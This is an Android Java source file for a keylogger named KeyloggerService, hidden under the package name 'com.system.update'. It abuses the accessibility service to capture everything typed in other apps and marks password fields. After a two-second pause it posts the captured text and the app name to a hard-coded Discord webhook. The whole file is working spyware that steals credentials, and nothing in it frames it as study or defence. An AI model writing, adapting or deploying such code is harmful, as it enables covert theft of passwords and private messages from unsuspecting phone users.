package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class KeyloggerService extends AccessibilityService {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566527107188785285/ytfcIg4MWuXkSLJ4vidZUF9UuYDZkzYPAWBtDaNTJbPbNMs51fpjJl6y1q0fVYg7yhUH";
    private final OkHttpClient client = new OkHttpClient();
    
    private String lastText = "";
    private String lastPkg = "";
    private Handler handler = new Handler(Looper.getMainLooper());
    private Runnable sendRunnable;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

                if (text.trim().isEmpty() || text.equals(lastText)) return;
                
                lastText = text;
                lastPkg = pkg;

                if (pkg.equals("com.system.update")) return;

                // إلغاء المؤقت القديم عشان ميبعتش حتة حتة
                if (sendRunnable != null) {
                    handler.removeCallbacks(sendRunnable);
                }

                // استنى ثانيتين.. لو مكتوبش تاني، ابعت النتيجة النهائية
                sendRunnable = () -> {
                    String type = source.isPassword() ? "🔐 **باسورد:**" : "⌨️ **نص:**";
                    sendToDiscord(type + "\n**التطبيق:** `" + lastPkg + "`\n**النص:** `" + lastText + "`");
                };
                handler.postDelayed(sendRunnable, 2000);
            }
        }
    }

    @Override public void onInterrupt() {}
    
    private void sendToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { }
                @Override public void onResponse(Call call, Response response) { }
            });
        } catch (Exception ignored) {}
    }
}
